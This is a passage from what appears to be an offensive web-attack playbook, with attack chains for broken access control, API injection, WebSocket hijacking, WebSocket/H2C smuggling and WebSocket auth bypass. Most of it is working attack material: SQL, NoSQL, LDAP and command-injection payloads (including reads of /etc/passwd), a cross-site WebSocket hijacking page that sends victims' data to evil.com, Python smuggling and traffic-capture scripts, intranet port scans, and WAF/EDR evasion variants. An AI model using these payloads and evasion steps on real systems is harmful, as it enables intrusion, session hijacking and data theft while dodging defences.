for doc_id in doc_1 doc_2 doc_3; do
  curl -H "Authorization: Bearer $TOKEN" "http://target.com/api/documents/$doc_id"
done

# Access other users' private data
GET /api/users/2/profile
GET /api/users/2/settings
GET /api/users/2/credit-cards
```

**4. 4. Modify/delete operations**
_Modify/delete-operation test_
```
# Modify another user's data
PUT /api/documents/doc_123
Authorization: Bearer user_b_token
{"title": "Modified by B"}

# Delete another user's data
DELETE /api/documents/doc_123
Authorization: Bearer user_b_token

# Add to another team
POST /api/teams/team_1/members
Authorization: Bearer attacker_token
{"user_id": "attacker_id"}
```

**WAF/EDR bypass variants:**

**1. Path traversal**
_Path-traversal bypass_
```
# Path-traversal access
GET /api/users/../admin
GET /api/users/..%2Fadmin

# Encoding bypass
GET /api/users/%2e%2e/admin
GET /api/users/..%c0%afadmin
```

**2. Parameter tampering**
_Parameter-tampering bypass_
```
# Modify the request method
# GET to POST
POST /api/documents/doc_123

# Add a parameter
GET /api/documents/doc_123?user_id=attacker

# Modify the Content-Type
Content-Type: application/xml
<document><id>doc_123</id></document>
```

---

### API injection attacks  `api-injection`
Various injection attacks in API endpoints
Sub-category: **API injection** · tags: `api` `injection` `sqli` `nosqli`

**Prerequisites:** the API accepts user input; the input is not correctly filtered

**Attack chain:**

**1. 1. SQL injection**
_API SQL injection_
```
# REST API SQL injection
GET /api/users?id=1 OR 1=1
GET /api/users?name=admin'--
GET /api/users?sort=name; SELECT SLEEP(5)--

# POST-request injection
POST /api/users
{"name": "admin' OR '1'='1"}

# JSON injection
POST /api/search
{"query": "test' UNION SELECT username,password FROM users--"}
```

**2. 2. NoSQL injection**
_NoSQL injection_
```
# MongoDB injection
GET /api/users?name[$ne]=
GET /api/users?age[$gt]=0
GET /api/users?role[$ne]=user

# POST request
POST /api/login
{"username": "admin", "password": {"$ne": ""}}

{"username": "admin", "password": {"$regex": ".*"}}

# Nested query
{"$where": "this.password == this.password"}
{"$where": "return true"}
```

**3. 3. LDAP injection**
_LDAP injection_
```
# LDAP injection
GET /api/users?name=*)(uid=*))(|(uid=*
GET /api/login?user=*&password=*

# Authentication bypass
POST /api/auth
{"user": "admin)(|(password=*))", "password": "x"}

# Information disclosure
GET /api/search?name=*)(objectClass=*)
```

**4. 4. Command injection**
_Command injection_
```
# OS command injection
GET /api/ping?host=127.0.0.1;id
GET /api/convert?file=test.pdf;cat /etc/passwd

# POST request
POST /api/exec
{"cmd": "ls -la; cat /etc/passwd"}

# Backtick injection
GET /api/check?host=`id`
GET /api/check?host=$(id)
```

**WAF/EDR bypass variants:**

**1. Encoding bypass**
_Encoding bypass_
```
# URL encoding
GET /api/users?id=1%20OR%201%3D1

# Unicode encoding
GET /api/users?id=1%u0020OR%u00201%3D1

# Double encoding
GET /api/users?id=1%2520OR%25201%253D1
```

**2. Content-Type bypass**
_Content-Type bypass_
```
# Switch Content-Type
Content-Type: application/xml
<user><id>1 OR 1=1</id></user>

Content-Type: application/x-www-form-urlencoded
id=1+OR+1=1

# JSON array
{"id": ["1", "OR", "1=1"]}
```

---

### · WebSocket security

### WebSocket cross-site hijacking (CSWSH)  `ws-hijack`
Exploit the lack of Origin validation during the WebSocket handshake to establish a cross-site WebSocket connection via a malicious web page. The attacker can hijack the victim's WebSocket session, steal real-time data, or send messages as the victim. Similar to CSRF but targeting the WebSocket protocol.
Sub-category: **WebSocket hijacking** · tags: `WebSocket` `CSWSH` `Origin` `cross-site` `session hijacking`

**Prerequisites:** the target uses WebSocket communication; the WebSocket handshake does not validate the Origin

**Attack chain:**

**1. 1. Identify the WebSocket endpoint**
_Search for WebSocket endpoints and test whether they accept cross-site connections from any Origin_
```
# Search for WebSocket connections in the frontend code
curl -s "https://{TARGET}/static/js/main.js" | grep -oP "wss?://[^\x27\x22\s]+"

# Browser developer tools inspection (Console)
# Filter for WS-type requests in the Network tab

# Manual connection test
websocat "wss://{TARGET}/ws" -H "Origin: https://evil.com" --no-close

# Check the Origin handling in the handshake response
curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGVzdA==" \
  -H "Origin: https://evil.com" \
  "https://{TARGET}/ws"
```

**2. 2. Construct a cross-site hijacking PoC page**
_Create a malicious HTML page that uses the victim's Cookie to establish a WebSocket connection and steal data_
```
<!-- CSWSH attack page -->
<html>
<body>
<h1>WebSocket Cross-Site Hijacking POC</h1>
<div id="output"></div>
<script>
  // Target WebSocket — the browser automatically includes the Cookie
  var ws = new WebSocket("wss://{TARGET}/ws");
  
  ws.onopen = function() {
    document.getElementById("output").innerHTML += "<p>Connected!</p>";
    // Send messages as the victim
    ws.send(JSON.stringify({action: "get_profile"}));
    ws.send(JSON.stringify({action: "list_messages"}));
  };
  
  ws.onmessage = function(evt) {
    // Steal the data returned by the WebSocket
    document.getElementById("output").innerHTML += "<pre>" + evt.data + "</pre>";
    // Exfiltrate to the attacker's server
    fetch("https://evil.com/collect", {
      method: "POST",
      body: evt.data
    });
  };
</script>
</body>
</html>
```

**3. 3. WebSocket message injection**
_Inject SQL/XSS/command-injection payloads via WebSocket messages_
```
# If the WebSocket message is concatenated into the backend query
# SQL injection
ws.send(JSON.stringify({
  action: "search",
  query: "test\x27 UNION SELECT username,password FROM users--"
}));

# XSS (if the message is rendered on other users' pages)
ws.send(JSON.stringify({
  action: "chat",
  message: "<img src=x onerror=alert(document.cookie)>"
}));

# Command injection
ws.send(JSON.stringify({
  action: "exec",
  target: "127.0.0.1;id"
}));
```

**4. 4. WebSocket traffic-analysis script**
_A Python script that monitors WebSocket traffic in real time and records sensitive data_
```
# Python WebSocket monitoring and analysis script
import asyncio
import websockets
import json

async def monitor():
    uri = "wss://{TARGET}/ws"
    headers = {"Cookie": "{SESSION_COOKIE}"}
    
    async with websockets.connect(uri, extra_headers=headers) as ws:
        # Send an authentication message
        await ws.send(json.dumps({"type": "auth", "token": "{TOKEN}"}))
        
        while True:
            msg = await ws.recv()
            data = json.loads(msg)
            print(f"[{data.get('type', 'unknown')}] {msg}")
            
            # Record sensitive data
            if 'password' in msg.lower() or 'token' in msg.lower():
                with open('ws_sensitive.log', 'a') as f:
                    f.write(msg + '\n')

asyncio.run(monitor())
```

**WAF/EDR bypass variants:**

**1. Bypass Origin validation**
_Bypass WebSocket Origin validation via Origin forgery, subdomains, null Origin, and subprotocols_
```
# Origin-header forgery (only effective in a non-browser environment)
websocat "wss://{TARGET}/ws" -H "Origin: https://{TARGET}"

# Subdomain bypass
Origin: https://test.{TARGET}  # if validation is not strict
Origin: https://{TARGET}.evil.com  # domain-suffix obfuscation

# null Origin (some browser scenarios)
# Use a data: URI or a sandboxed iframe
<iframe sandbox="allow-scripts" src="data:text/html,<script>new WebSocket('wss://{TARGET}/ws')</script>">

# Use a WebSocket subprotocol to bypass
Sec-WebSocket-Protocol: graphql-ws, chat
```

---

### WebSocket smuggling attack  `ws-smuggling`
Exploit the differences in how reverse proxies / load balancers handle the WebSocket protocol to smuggle HTTP requests to internal services via a WebSocket upgrade request. The attacker can bypass front-end security controls to communicate directly with the backend, accessing protected internal APIs or management interfaces.
Sub-category: **WebSocket smuggling** · tags: `WebSocket` `smuggling` `reverse proxy` `H2C` `intranet pivot`

**Prerequisites:** the target uses a reverse proxy (Nginx/Varnish, etc.); the proxy allows WebSocket upgrades; internal services exist on the backend

**Attack chain:**

**1. 1. Detect WebSocket-smuggling possibility**
_Use an Upgrade request to test whether the reverse proxy has a WebSocket/H2C smuggling vulnerability_
```
# Test the Upgrade response
curl -i -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGVzdA==" \
  "https://{TARGET}/"

# Test H2C smuggling (HTTP/2 Cleartext)
curl -i -H "Connection: Upgrade, HTTP2-Settings" \
  -H "Upgrade: h2c" \
  -H "HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA" \
  "https://{TARGET}/"

# Detect the proxy type
curl -I "https://{TARGET}/" | grep -iE "server:|via:|x-powered-by:"
```

**2. 2. WebSocket tunnel construction**
_After the WebSocket upgrade, send smuggled HTTP requests over the raw socket to access internal endpoints_
```
# Use Python to construct WebSocket smuggling
import socket, ssl, base64

def ws_smuggle(target_host, target_port, internal_path):
    # WebSocket handshake
    key = base64.b64encode(b"test1234test1234").decode()
    upgrade = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {target_host}\r\n"
        f"Upgrade: websocket\r\n"
        f"Connection: Upgrade\r\n"
        f"Sec-WebSocket-Version: 13\r\n"
        f"Sec-WebSocket-Key: {key}\r\n"
        f"\r\n"
    )
    
    ctx = ssl.create_default_context()
    sock = ctx.wrap_socket(socket.socket(), server_hostname=target_host)
    sock.connect((target_host, target_port))
    sock.send(upgrade.encode())
    
    resp = sock.recv(4096).decode()
    print(f"Upgrade response: {resp[:100]}")
    
    if "101" in resp:
        # Smuggle an HTTP request to the intranet
        smuggled = (
            f"GET {internal_path} HTTP/1.1\r\n"
            f"Host: 127.0.0.1\r\n"
            f"\r\n"
        )
        sock.send(smuggled.encode())
        print(sock.recv(4096).decode())

ws_smuggle("{TARGET}", 443, "/admin/")
```

**3. 3. H2C smuggling to bypass access control**
_Use the h2cSmuggler tool to smuggle via HTTP/2 upgrade and access internal services and management interfaces_
```
# h2cSmuggler tool
python3 h2cSmuggler.py -x "https://{TARGET}" \
  "http://{TARGET}/admin/"

# Manual H2C smuggling — access an internal API
python3 h2cSmuggler.py -x "https://{TARGET}" \
  "http://127.0.0.1:8080/api/internal/users"

# Scan intranet ports
for port in 80 8080 8443 9090 3000 5000; do
  python3 h2cSmuggler.py -x "https://{TARGET}" \
    "http://127.0.0.1:$port/" 2>/dev/null && echo "Port $port: OPEN"
done
```

**4. 4. Exploiting reverse-proxy differences**
_Exploit the differences in WebSocket handling across different reverse proxies (Nginx/Varnish/HAProxy) to smuggle_
```
# Nginx WebSocket smuggling
# If Nginx is configured with proxy_pass to the backend
# but does not restrict Upgrade requests

# Test reverse-proxy path differences
curl -H "Connection: Upgrade" -H "Upgrade: websocket" \
  "https://{TARGET}/..;/admin/"

# Varnish cache poisoning + WebSocket
curl -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "X-Forwarded-Host: evil.com" \
  "https://{TARGET}/"

# HAProxy WebSocket smuggling
# Exploit HAProxy no longer checking subsequent requests after the Upgrade
curl -H "Connection: Upgrade" -H "Upgrade: websocket" \
  "https://{TARGET}/" --next -H "Host: internal" "https://{TARGET}/admin/"
```

**WAF/EDR bypass variants:**

**1. Bypass the WAF's WebSocket detection**
_Bypass the WAF's WebSocket-smuggling detection via case obfuscation, chunked transfer, and the compression Extension_
```
# Case obfuscation
Connection: upgrade
Upgrade: WebSocket  # casing variant
Upgrade: WEBSOCKET

# Chunked transfer to hide the smuggled content
Transfer-Encoding: chunked
# Embed an HTTP request in a WebSocket frame

# Use the WebSocket Extension to obfuscate
Sec-WebSocket-Extensions: permessage-deflate
# The compressed malicious message is hard for the WAF to detect

# Disguise as normal WebSocket traffic
# Send a normal message first, then send the smuggled request after a delay
```

---

### WebSocket authentication and authorization bypass  `ws-auth-bypass`
Exploit the lack of continuous authentication checks after a WebSocket connection is established, bypassing authentication and authorization via session fixation, token replay, unauthorized channel subscription, etc. The long-lived nature of WebSocket connections means the original connection can retain access even after a permission change.
Sub-category: **authentication bypass** · tags: `WebSocket` `authentication` `authorization` `privilege escalation` `Token replay`

**Prerequisites:** the target uses WebSocket real-time communication; a valid session/Token has been obtained

**Attack chain:**

**1. 1. Analyze the WebSocket authentication mechanism**
_Intercept and analyze the authentication flow by monkey-patching the WebSocket object_
```
# Capture the WebSocket handshake and initial messages
# In the browser Console:
const origWS = WebSocket;
window.WebSocket = function(url, protocols) {
  console.log("[WS] Connecting to:", url);
  const ws = new origWS(url, protocols);
  const origSend = ws.send.bind(ws);
  ws.send = function(data) {
    console.log("[WS] SEND:", data);
    origSend(data);
  };
  ws.addEventListener("message", e => console.log("[WS] RECV:", e.data));
  return ws;
};

# Observe the authentication flow:
# 1. Is the Cookie/Token passed during the handshake?
# 2. Is an auth message sent after connecting?
# 3. Is there a heartbeat keep-alive mechanism?
```

**2. 2. Token replay and session fixation**
_Test token replay after expiration and whether the WebSocket connection is still active after logout_
```
# Test whether the Token can still be used after expiration
# Step 1: record a valid Token
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# Step 2: wait for the Token to expire / log out the account
# Step 3: try to establish a WebSocket connection with the old Token
websocat "wss://{TARGET}/ws" \
  -H "Authorization: Bearer $TOKEN" 2>&1 | head -5

# Test whether the WebSocket connection is still active after the user logs out
# (a long-lived WebSocket connection may not be affected by HTTP session logout)

# Session fixation — use someone else's Token
websocat "wss://{TARGET}/ws" \
  -H "Cookie: session={OTHER_USER_SESSION}"
```

**3. 3. Unauthorized channel/room subscription**
_Test the authorization control of WebSocket channels/rooms, attempting to subscribe to others' private channels without authorization_
```
# Subscribe to another user's private channel
ws.send(JSON.stringify({
  action: "subscribe",
  channel: "user.1002.notifications"  // try to subscribe to another user
}));

# Subscribe to the admin channel
ws.send(JSON.stringify({
  action: "subscribe",
  channel: "admin.dashboard"
}));

# Traverse channel IDs
for (let i = 1; i <= 100; i++) {
  ws.send(JSON.stringify({
    action: "subscribe",
    channel: `user.${i}.messages`
  }));
}

# Test channel-name injection
ws.send(JSON.stringify({
  action: "subscribe",
  channel: "public.*"  // wildcard subscription
}));
```

**4. 4. WebSocket rate-limit and DoS testing**
_Test the WebSocket message rate limit and size limit_
```
# Test the message rate limit
import asyncio, websockets, json, time

async def rate_test():
    uri = "wss://{TARGET}/ws"
    async with websockets.connect(uri) as ws:
        # Rapidly send messages to test the rate limit
        start = time.time()
        for i in range(1000):
            await ws.send(json.dumps({"action": "ping", "seq": i}))
        elapsed = time.time() - start
        print(f"Sent 1000 messages in {elapsed:.2f}s")
        
        # Large-message test
        large_msg = "A" * (1024 * 1024)  # 1MB
        try:
            await ws.send(large_msg)
            print("Large message accepted - no size limit!")
        except Exception as e:
            print(f"Large message rejected: {e}")

asyncio.run(rate_test())
```

**WAF/EDR bypass variants:**

**1. Bypass the WebSocket authentication mechanism**
_Bypass WebSocket authentication via protocol downgrade, reconnection mechanisms, and polling downgrade_
```
# Use a low-privilege Token to obtain a high-privilege WebSocket connection
# Some implementations only validate the Token during the handshake and no longer check after connecting

# Exploit the WebSocket reconnection mechanism
# Some client implementations automatically reconnect after a disconnect
# Intercept the reconnection request and replace the Token

# Protocol-downgrade attack
# Downgrade from wss:// to ws:// (if the backend supports it)
websocat "ws://{TARGET}/ws" -H "Cookie: session={TOKEN}"

# Exploit the HTTP downgrade of Socket.io/SockJS
curl "https://{TARGET}/socket.io/?EIO=4&transport=polling&sid={SID}"
```

---
